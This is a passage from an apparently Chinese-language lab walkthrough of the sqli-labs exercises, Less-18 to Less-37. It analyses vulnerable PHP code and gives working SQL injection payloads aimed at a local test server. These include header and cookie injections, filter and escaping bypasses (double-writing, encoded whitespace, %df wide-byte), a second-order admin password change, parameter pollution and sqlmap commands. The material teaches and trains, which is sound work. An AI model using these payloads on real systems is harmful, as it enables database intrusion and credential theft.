$_SERVER[&#39;REMOTE_ADDR&#39;]，客户端不能伪造。 所以这里的 IP 是无法被伪造的，这里只能通过修改 user-agent 来进行注入，考虑到 insert 语句的特殊性，这里使用闭合方式来闭合掉后面的语句，因为输出了 mysql 报错日志了，这里尝试报错注入效率会更高一点： 12345678910111213POST /Less-18/ HTTP/1.1Host: 127.0.0.1:8888User-Agent: 1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) and '1'='1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://127.0.0.1:8888/Less-18/Content-Type: application/x-www-form-urlencodedContent-Length: 38Connection: closeUpgrade-Insecure-Requests: 1uname=admin&amp;passwd=admin&amp;submit=Submit Less-19 请求方式 注入类型 拼接方式 POST 报错、布尔盲注、延时盲注 VALUES (&#39;$uagent&#39;) 简单源码分析: 123456789101112131415161718# 获取请求的 referer 和 ip 地址$uagent = $_SERVER['HTTP_REFERER'];$IP = $_SERVER['REMOTE_ADDR'];if 输入了uname 和 passwd: # uname 和 passwd 参数均被过滤 $uname = check_input($_POST['uname']); $passwd = check_input($_POST['passwd']); $sql="SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"; if SQL语句有返回结果: # 单引号拼接后直接带入 insert 语句 $insert="INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')"; 输出 $_SERVER['HTTP_REFERER'] print_r(mysql_error()); else: print_r(mysql_error()); 本关和 Less-18 异曲同工，只是这里的漏洞点出在了 referer 里面，其他利用方式基本上也是一毛一样，所以下面直接上 payload 演示吧： 12345678910111213POST /Less-19/ HTTP/1.1Host: 127.0.0.1:8888User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) and '1'='1Content-Type: application/x-www-form-urlencodedContent-Length: 38Connection: closeUpgrade-Insecure-Requests: 1uname=admin&amp;passwd=admin&amp;submit=Submit Less-20 请求方式 注入类型 拼接方式 POST 联合、报错、布尔盲注、延时盲注 username=&#39;$cookee&#39; 简单源码分析: 123456789101112131415161718192021222324252627282930&lt;?phpif cookie 中不存在 uname 参数: 输出了一堆无用的信息 if 提交了 uname 和 passwd: # 进行过滤 $uname = check_input($_POST['uname']); $passwd = check_input($_POST['passwd']); $sql="SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"; $cookee = $row1['username']; if 有查询结果: # 将 uname 的值设置给 cookie 里面的 uname 参数 setcookie('uname', $cookee, time()+3600); else: print_r(mysql_error());else: if POST 数据里面没有 submit 参数: $cookee = $_COOKIE['uname']; # 直接将 cookee 通过单引号拼接到 SQL 语句中 $sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"; if 查询无结果: 输出 mysql_error() if 有结果: 输出查询的信息 else: # 将 uname 的值设置给 cookie 里面的 uname 参数 setcookie('uname', $row1['username'], time()-3600);?&gt; 从源码中可以分析出 Less-20 要复杂一点，不过问题还是存在，从 cookie 中读取的 uname 参数值 并直接拼接到了 SQL 语句中了，这就导致了注入点的产生，并且还输出了查询信息，所以这里也是可以进行联合查询注入的。因为是基础关卡的最后一关，所以这里国光老毛病又犯了，这里就再啰嗦一下： 联合查询注入123456789GET /Less-20/ HTTP/1.1Host: 127.0.0.1:8888User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: uname=admin' and 1=2 union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)#Connection: closeUpgrade-Insecure-Requests: 1 报错注入123456789GET /Less-20/ HTTP/1.1Host: 127.0.0.1:8888User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: uname=admin'+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)#Connection: closeUpgrade-Insecure-Requests: 11 盲注布尔盲注和延时盲注也是 OK 的，但是实际上手工注入的效率并不如联合与报错注入，所以国光这里就不演示了，下面直接演示sqlmap的注入过程吧： sqlmap联合查询注入 如果 --level 设置为 2 或更高，则 sqlmap 会对 HTTP Cookie 请求头进行 SQL 注入测试: 1sqlmap -u "http://127.0.0.1:8888/Less-20/" --cookie="uname=admin" -p "uname" --dbms=MySQL --random-agent --flush-session --technique=U -v 3 --level=2 当然手动通过*来标记注入也比较方便：--cookie=&quot;uname=admin*&quot; 报错注入 1sqlmap -u "http://127.0.0.1:8888/Less-20/" --cookie="uname=admin*"--dbms=MySQL --random-agent --flush-session --technique=E -v 3 布尔盲注 1sqlmap -u "http://127.0.0.1:8888/Less-20/" --cookie="uname=admin*"--dbms=MySQL --random-agent --flush-session --technique=B -v 3 延时盲注 1sqlmap -u "http://127.0.0.1:8888/Less-20/" --cookie="uname=admin*"--dbms=MySQL --random-agent --flush-session --technique=B -v 3 高级注入姿势 21-37 关Less-21 请求方式 注入类型 拼接方式 POST 联合、报错、布尔盲注、延时盲注 username=(&#39;$cookee&#39;) 简单源码分析： 123456789101112131415161718192021222324252627282930&lt;?phpif cookie 中不存在 uname 参数: 输出了一堆无用的信息 if 提交了 uname 和 passwd: # 进行过滤 $uname = check_input($_POST['uname']); $passwd = check_input($_POST['passwd']); $sql="SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"; if 有查询结果: # 将 uname 的值设置给 cookie 里面的 uname 参数 setcookie('uname', base64_encode($row1['username']), time()+3600); else: print_r(mysql_error());else: if POST 数据里面没有 submit 参数: # 对 cookee 进行 base64 解密 $cookee = base64_decode($cookee); # 直接将 cookee 通过单引号拼接到 SQL 语句中 $sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"; if 查询无结果: 输出 mysql_error() if 有结果: 输出查询的信息 else: # 将 uname 的值设置给 cookie 里面的 uname 参数 setcookie('uname', base64_encode($row1['username']), time()-3600);?&gt; 从源码中分析可得，和 Less-20 基本上是一毛一样，只是 Coojie 这里是经过 base64 加密的，所以我们只需要传入加密后的 payload 给 cookie 的 uname 即可，下面就只用联合查询注入来简单演示一下吧： 123456789GET /Less-21/ HTTP/1.1Host: 127.0.0.1:8888User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: uname=c3Fsc2VjJykgdW5pb24gc2VsZWN0IDEsMiwoU0VMRUNUIEdST1VQX0NPTkNBVCh1c2VybmFtZSxwYXNzd29yZCBTRVBBUkFUT1IgMHgzYzYyNzIzZSkgRlJPTSB1c2VycykjConnection: closeUpgrade-Insecure-Requests: 1 Cookie 的 uname 参数 Base64 解码为： 1uname=sqlsec&apos;) union select 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)# sqlmap手工注入问题不大，那么尝试直接使用 sqlmap 来进行联合查询注入看看： 1sqlmap -u "http://127.0.0.1:8888/Less-21/" --cookie="uname=*" --tamper="base64encode" --dbms=MySQL --random-agent --flush-session --technique=U -v 3 sqlmap 本身不会混淆发送的 payload，混淆 payload 的话可以使用 sqlmap 自带的 payload 库 Less-22 请求方式 注入类型 拼接方式 POST 联合、报错、布尔盲注、延时盲注 username=&quot;$cookee&quot; 简单源码分析： 123# 先双引号 然后直接拼接到SQL语句中$cookee1 = '"'. $cookee. '"';$sql="SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1"; 可以发现和 Less-21 相比，只是拼接方式不一样，其他都是一致的，国光这里就不再啰嗦了。 123456789GET /Less-22/ HTTP/1.1Host: 127.0.0.1:8888User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: uname=c3Fsc2VjIiB1bmlvbiBzZWxlY3QgMSwyLChTRUxFQ1QgR1JPVVBfQ09OQ0FUKHVzZXJuYW1lLHBhc3N3b3JkIFNFUEFSQVRPUiAweDNjNjI3MjNlKSBGUk9NIHVzZXJzKSM=Connection: closeUpgrade-Insecure-Requests: 1 Cookie 的 uname 参数 Base64 解码为： 1uname=sqlsec&quot; union select 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)# Less-23 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id=&#39;$id&#39; 简单源码分析： 1234567891011121314151617# 获取到 id 的值$id=$_GET['id'];# 过滤了 id 中的 # 和 -- 然后 替换为 空$reg = "/#/";$reg1 = "/--/";$replace = "";$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id);# 使用单引号拼接 SQL$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";if 有查询结果: 输出查询信息else: print_r(mysql_error()); 过滤了注释符号，但是这里还可以考虑使用闭合方式来进行注入，下面直接使用最简单的联合查询注入吧： 1?id=-1&apos; union select 1,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,password,0x3c62723e))))x),3 and &apos;1&apos;=&apos;1 Less-24一个经典的二次注入场景，所以下面国光来单个理一下源码。 代码分析 index.php 主要记录了表单相关的信息，没有啥敏感代码，当做 Index.html 来看待就可以了，具体的界面如下： 提示输入用户名和密码，用户名和密码正确之后就可以成功登陆，否则登陆失败。 忘记密码：左下角的忘记密码选项提示：如果你忘记密码 请 hack it 新建用户：右下角新建用户可以新建一个自己的用户 failed.php 检测会话，如果 cookie 里面没有 Auth 参数的话，就跳转到 index.php forgot_password.php 简单提示：如果你忘记密码 请 hack it Logged-in.php 登录后的信息展示，显示登录名称并且提供了修改密码的表单 new_user.php 创建新用户的表单页面，本文件主要存放前段代码。 login_create.php 创建新用户的后端代码，下面来简单理一下代码的流程： 12345678910111213141516# 接受用户提交的用户名和密码值 并进行 mysql 安全函数转义username= mysql_escape_string($_POST['username']) ;$pass= mysql_escape_string($_POST['password']);$re_pass= mysql_escape_string($_POST['re_password']);# 查询当前用户信息$sql = "select count(*) from users where username='$username'";如果当前用户已经存在 无法注册if 两次输入密码一致： # 将记录插入数据库中 $sql = "insert into users ( username, password) values(\"$username\", \"$pass\")"; 查询完成后 重定向到首页else: 提示两次输入密码不一致 login.php 1234# 登录用户名和密码都被过滤了$username = mysql_real_escape_string($_POST["login_user"]);$password = mysql_real_escape_string($_POST["login_password"]);$sql = "SELECT * FROM users WHERE username='$username' and password='$password'"; pass_change.php 1234567891011121314if 检测未登录： 重定向到首页if 检测到提交表单： # 对 pass 都进行了过滤 $username= $_SESSION["username"]; $curr_pass= mysql_real_escape_string($_POST['current_password']); $pass= mysql_real_escape_string($_POST['password']); $re_pass= mysql_real_escape_string($_POST['re_password']); if 两次密码一致: # 直接将 username 拼接到 SQL 语句 $sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "; else: 提示密码不一致 并重定向到 fail.php 思路分析从代码上来看貌似都被转义了，乍一看是成功注入的。实际上的确不能使用常规的思路来进行注入，因为这题是二次注入，ISCC 2019 当时使用这题的考查点是修改掉 admin 用户的密码，然后再登录即可。假设不知道 admin 用户的情况下，想要修改掉 admin 用户的密码的话，这里就使用的是二次注入的姿势了。 二次注入 简单概括就是黑客精心构造 SQL 语句插入到数据库中，数据库报错的信息被其他类型的 SQL 语句调用的时候触发攻击行为。因为第一次黑客插入到数据库的时候并没有触发危害性，而是再其他语句调用的时候才会触发攻击行为，这个就是二次注入。 先看创建用户的地方： 1username = mysql_escape_string($_POST['username']) ; username 被 mysql_escape_string 函数过滤了，该函数的作用如下： 危险字符 转义后 \ \\ &#39; \&#39; &quot; \&quot; 再看下更新密码的核心语句： 1UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' 这里直接使用单引号拼接了 username 所以当 username 可控的话 ，这里是存在SQL注入的，假设用户注册的 username 的值为：admin&#39;#，那么此时的完整语句就为： 1UPDATE users SET PASSWORD='$pass' where username='admin'# and password='$curr_pass' 此时就完全改变了语义，直接就修改掉了 admin 用户的密码。 步骤演示常见一个admin&#39;#开头的用户名，下面列举的几种都可以，以此类推，很灵活： 1234admin&apos;#1admin&apos;#233admin&apos;#gg... 注册完成后数据库的记录信息如下： 123456mysql&gt; select * from users;+----+---------------+------------+| id | username | password |+----+---------------+------------+| 20 | admin'#hacker | 111 |+----+---------------+------------+ 成功添加了记录，这里单引号数据库中中看没有被虽然转义了，这是因为转义只不过是暂时的，最后存入到数据库的时候还是没变的。 接下来登录 admin&#39;#hacker 用户，然后来修改当前的密码： 此时来数据库中查看，可以发现成功修改掉了 admin 用的密码了： 1234567mysql&gt; select * from users;+----+---------------+------------+| id | username | password |+----+---------------+------------+| 8 | admin | 233 || 20 | admin'#hacker | 111 |+----+---------------+------------+ Less-25 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id=&#39;$id&#39; 关键代码分析： 1234567# id 直接单引号拼接$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";# 但是 id 被如下函数过滤了$id= preg_replace('/or/i',"", $id);$id= preg_replace('/AND/i',"", $id);return $id; 过滤了 or 和 and 关键词，但是还存在很多方法可以绕过，下面具体演示一下： 双写嵌套绕过12?id=-1&apos; union select 1,2,(SELECT+GROUP_CONCAT(username,passwoorrd+SEPARATOORR+0x3c62723e)+FROM+users)--+password` 写成了 `passwoorrd`，`SEPARATOR`写成`SEPARATOORR 符号替换123or` -&gt; `||and` -&gt; `&amp;&amp;?id=1&apos;||extractvalue(1,concat(0x7e,database()))--+ Less-25a 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注 id=$id 与 Less-25 相比，只是拼接方式改变，因为代码中没有输出报错信息，所以也无法进行报错注入，其他利用方式都是一样的，国光这里不再啰嗦。 Less-26 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id=&#39;$id&#39; 简单源码分析： 1234567891011121314151617# 过滤了 or 和 and 大小写$id= preg_replace('/or/i',"", $id); //strip out OR (non case sensitive)$id= preg_replace('/and/i',"", $id); //Strip out AND (non case sensitive)# 过滤了 /*$id= preg_replace('/[\/\*]/',"", $id); //strip out /*# 过滤了 -- 和 # 注释$id= preg_replace('/[--]/',"", $id); //Strip out --$id= preg_replace('/[#]/',"", $id); //Strip out ## 过滤了空格$id= preg_replace('/[\s]/',"", $id); //Strip out spaces# 过滤了斜线$id= preg_replace('/[\/\\\\]/',"", $id); //Strip out slashesreturn $id; 过滤了 or 和 and 可以采用 双写或者 &amp;&amp; || 绕过 过滤注释 可以使用闭合绕过 过滤了空格 可以使用如下的符号来替代： 符号 说明 %09 TAB 键(水平) %0a 新建一行 %0c 新的一页 %0d return 功能 %0b TAB 键(垂直) %a0 空格 直接上 payload 吧： 1?id=100&apos;%0bunion%0bselect%0b1,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,passwoorrd,0x3c62723e))))x),3%0baandnd%0b&apos;1&apos;=&apos;1 Less-26a 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注 id=(&#39;$id&#39;) 与 Less-26 相比，只是拼接方式改变了，因为没有输出报错信息，所以不能使用报错注入了，然后不再啰嗦，大家可以自行测试。 Less-27 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id=(&#39;$id&#39;) 过滤规则又增加了许多： 12345678910111213141516171819# 过滤了 /*$id= preg_replace('/[\/\*]/',"", $id);# 过滤了 -$id= preg_replace('/[--]/',"", $id);# 过滤了 #$id= preg_replace('/[#]/',"", $id);# 过滤了空格$id= preg_replace('/[ +]/',"", $id);# 过滤了 select /m 严格模式 不可以使用双写绕过$id= preg_replace('/select/m',"", $id);$id= preg_replace('/select/s',"", $id);$id= preg_replace('/Select/s',"", $id);$id= preg_replace('/SELECT/s',"", $id);# 过滤了 union UNION$id= preg_replace('/union/s',"", $id);$id= preg_replace('/Union/s',"", $id);$id= preg_replace('/UNION/s',"", $id);return $id; union 和 select 没有忽略大小写 导致写了很多冗杂的规则，但还是可以轻易绕过。 1234567891011# 大小写混写unioNunIonseLect...# 嵌套双写uunionnionsselectelectununionion... 很多种方案，不再赘述，下面直接丢 payload： 1?id=100&apos;%0bununionion%0bseLect%0b1,(seLect(@x)FROM(seLect(@x:=0x00) ,(seLect(@x)FROM(users)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,password,0x3c62723e))))x),3%0band%0b&apos;1 Less-27a 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注 id=&quot;$id&quot; 和 Less-27 相比，只是拼接方式发生了改变，又因为没有报错日志的输出，所以少了报错注入的利用方式，利用方式换汤不换药，这里不做演示了。 Less-28 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注 id=(&#39;$id&#39;) 过滤规则如下： 12345678910111213# 过滤 /*$id= preg_replace('/[\/\*]/',"", $id);# 过滤 - # 注释$id= preg_replace('/[--]/',"", $id);$id= preg_replace('/[#]/',"", $id);# 过滤 空格 +$id= preg_replace('/[ +]/',"", $id);.# 过滤 union select /i 大小写都过滤$id= preg_replace('/union\s+select/i',"", $id);return $id; 这里 union 和 select 这里可以使用双写嵌套绕过，过滤了注释的话 就使用闭合绕过，过滤了空格使用 Less-26 的编码绕过，OK分析完成后直接放完整的 payload 吧： 1?id=100&apos;)%0bunion%a0select%0b1,(SELECT%0bGROUP_CONCAT(username,password%0bSEPARATOR%0b0x3c62723e)%0bFROM%0busers),3%a0and%0b(&apos;1 Less-28a 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注 id=(&#39;$id&#39;) 比 Less-27 还少了几个过滤规则，这样直接丢 payload 吧： 1?id=-1&apos;) union%a0select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users) --+ Less-29 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id=(&#39;$id&#39;) 这一题和注入天书里面描述的环境不太一样，还是具体分析看下代码吧。 index.php 1234567# id = 'x' 的拼接方式$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";if 查询到结果: 输出查询的详细信息else: print_r(mysql_error()); 从源码来看的话和前面的貌似没有啥区别，直接尝试联合注入看看吧： 1index.php?id=-1&apos; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users) --+ 这个 index.php 太简单了，不知道啥意思，下面直接重点来看 login.php 吧： login.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# 查询 query 的字符串$qs = $_SERVER['QUERY_STRING'];# 模拟 tomcat 的查询函数 处理一下$id1=java_implimentation($qs);$id=$_GET['id'];# 再次过滤检测whitelist($id1);$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";if 查询到结果: 输出查询的详细信息else: print_r(mysql_error());?&gt;function java_implimentation($query_string)&#123; $q_s = $query_string; # &amp; 作为分隔符 分割字符串 $qs_array= explode("&amp;",$q_s); # 遍历 qs_array 数组 foreach($qs_array as $key =&gt; $value) &#123; $val=substr($value,0,2); # 如果数组前两位是 id 的话 if($val=="id") &#123; # 截取 $value 的3-30 的字符串 作为 id 的值 $id_value=substr($value,3,30); return $id_value; echo "&lt;br&gt;"; break; &#125; &#125;&#125;function whitelist($input)&#123; # 过滤规则 检测数字 $match = preg_match("/^\d+$/", $input); if 不符合规则： header('Location: hacked.php');&#125; 从代码中还是很容易发现问题的，关键问题出在下面的地方： 1234$id1=java_implimentation($qs);...whitelist($id1);whitelist` 过滤是比较严格的，如果 id 不是数字的话就会直接重定向到 `hacked.php`，这里是没毛病的。那么问题出在了这里函数`$id1=java_implimentation($qs); 因为 return 表示了函数的结束运行，所以这个函数捕捉到 id 的时候就会返回 return $id_value，这样就导致了 用户加入构造两组 id 的话，那么后面的 id 就会绕过函数检测。 假设用户输入这样的语句： 1index.php?id=1&amp;id=2 Apache PHP 会解析最后一个参数 Tomcat JSP 会解析第一个参数 知道这个原理的话后面尝试直接注入吧： 1login.php?id=1&amp;id=-2&apos; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+ Less-30 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id=&quot;$id&quot; 和 Less-29 相比没有啥本质变化，只是拼接方式不一样。 Less-31 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id=（&quot;$id&quot;） 和 Less-29 相比没有啥本质变化，只是拼接方式不一样。 Less-32 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id=&#39;$id&#39; 考察 Bypass addslashes()，关键的防护代码如下： 123456789101112if(isset($_GET['id']))$id=check_addslashes($_GET['id']);# 在' " \ 等敏感字符前面添加反斜杠function check_addslashes($string)&#123; # \ 转换为 \\ $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string); 将 # 将 ' 转为\" $string = preg_replace('/\'/i', '\\\'', $string); # 将 " 转为\" $string = preg_replace('/\"/', "\\\"", $string); return $string;&#125; 宽字节注入原理 MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如 %aa%5c 就是一个 汉字。因为过滤方法主要就是在敏感字符前面添加 反斜杠 \，所以这里想办法干掉反斜杠即可。 %df 吃掉 \ 具体的原因是 urlencode(\&#39;) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把%df%5c 当做是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。 将 \&#39; 中的 \ 过滤掉 例如可以构造 %5c%5c%27 的情况，后面的%5c会被前面的%5c 给注释掉。这也是 bypass 的一种方法。 本关卡采用第一种 %df 宽字节注入来吃掉反斜杠，下面直接丢 payload 吧： 1?id=-1%df&apos; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+ Less-33 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id=&#39;$id&#39; 拼接方式也是一样的，过滤方法细节有点变化，具体如下： 12345function check_addslashes($string)&#123; $string= addslashes($string); return $string;&#125; addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。 预定义字符 转义后 \ \\ &#39; \&#39; &quot; \&quot; 该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串，和 Less-32 的函数功能是差不的，依旧可以使用宽字节进行注入。 注入天书：使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞 Less-34 请求方式 注入类型 拼接方式 POST 联合、报错、布尔盲注、延时盲注 username=&#39;$uname&#39; 过滤方法依然和 Less-33 一致： 12$uname = addslashes($uname1);$passwd= addslashes($passwd1); 只是由 GET 型变成了 POST 型，所以下面直接丢 POST 的数据包 payload 了： 1uname=admin%df&apos; union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd=233 MySQL 注入天书这里介绍了一个新的方法 将 utf-8 转换为 utf-16 或 utf-32，例如将 &#39; 转为 utf-16 为� 我们就 可以利用这个方式进行尝试，可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换： 1234➜ ~ echo \'|iconv -f utf-8 -t utf-16��'➜ ~ echo \'|iconv -f utf-8 -t utf-32��' 首先尝试一个经典的万能密码： 1uname=�&apos; or 1#&amp;passwd= 为什么这个万能密码可以生效呢，因为拼接到 SQL 中是如下的效果： 1SELECT username, password FROM users WHERE username='�' or 1#and password='$passwd' LIMIT 0,1 or 1 是一个永真的条件，不论 select 选择出的内容是什么。or 1 之后时钟都是 1，下面是控制后台的演示： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# where username = 'x' or 1mysql&gt; select * from users where username = 'x' or 1;+----+---------------+------------+| id | username | password |+----+---------------+------------+| 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 3 | Dummy | p@ssword || 4 | secure | crappy || 5 | stupid | stupidity || 6 | superman | genious || 7 | batman | mob!le || 8 | admin | 233 || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 || 21 | admin'#hacker | 111 |+----+---------------+------------+14 rows in set (0.00 sec)# where username = 'x' or 0mysql&gt; select * from users where username = 'x' or 0;Empty set (0.00 sec)# where 1mysql&gt; select * from users where 1;+----+---------------+------------+| id | username | password |+----+---------------+------------+| 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 3 | Dummy | p@ssword || 4 | secure | crappy || 5 | stupid | stupidity || 6 | superman | genious || 7 | batman | mob!le || 8 | admin | 233 || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 || 21 | admin'#hacker | 111 |+----+---------------+------------+14 rows in set (0.00 sec)# where 0mysql&gt; select * from users where 0;Empty set (0.00 sec) 那么直接尝试一下最基本的联合查询注入看看： 1uname=�&apos; and 1=2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd= 也是 OK 的 Less-35 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id=$id Less-35 的防护措施有点搞笑，首先 id 使用了如下规则过滤： 1234567$id=check_addslashes($_GET['id']);function check_addslashes($string)&#123; $string = addslashes($string); return $string;&#125; 但是本关的拼接方式是： 1$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1"; 实际进行注入利用的时候并不需要写单引号，那么就尝试直接注入看看吧： 1?id=-1 union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+ Less-36 请求方式 注入类型 拼接方式 GET 联合、报错、布尔盲注、延时盲注 id=&#39;$id&#39; 主要防护代码： 1234567$id=check_quotes($_GET['id']);function check_quotes($string)&#123; $string= mysql_real_escape_string($string); return $string;&#125; 这一关主要考查了 Bypass MySQL Real Escape String，mysql_real_escape_string 会检测并转义如下危险字符： 危险字符 转义后 \ \\ &#39; \&#39; &quot; \&quot; 这一关使用 Less-34 关的两种思路依然是可行的，下面直接尝试 payload 进行注入吧： 1?id=-1%df&apos; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+ 或者 1?id=-1�&apos; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+ Less-37 请求方式 注入类型 拼接方式 POST 联合、报错、布尔盲注、延时盲注 username=&#39;$uname&#39; 依然使用了 和 Less-36 的防护方法： 12$uname = mysql_real_escape_string($uname1);$passwd= mysql_real_escape_string($passwd1); 所以利用思路也是一毛一样的，只是由 GET 型变成了 POST 型了，下面就直接尝试注入吧： 1uname=%df&apos; and 1=2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd= 或者： 1uname=�&apos; and 1=2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd= 堆叠注入 38-53 关原理介绍MySQL 的命令行中，每一条语句以;结尾，这代表语句的结束，如果在注入过程中在;后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。下面就是简单的示例： 1234567891011121314mysql&gt; select * from users where id = 1;select version();+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)+-------------------------+| version() |+-------------------------+| 5.5.44-0ubuntu0.14.04.1 |+-------------------------+1 row in set (0.00 sec) 与 union select 联合查询相比，堆叠查询更加灵活，可以执行任意的 SQL 语句。 局限性 并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎。 在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略 这个就是为什么我们尝试用 union select 联合查询的原因，使用堆叠注入前，我们还需要了解数据库的相关信息才可以，如表名、列名等 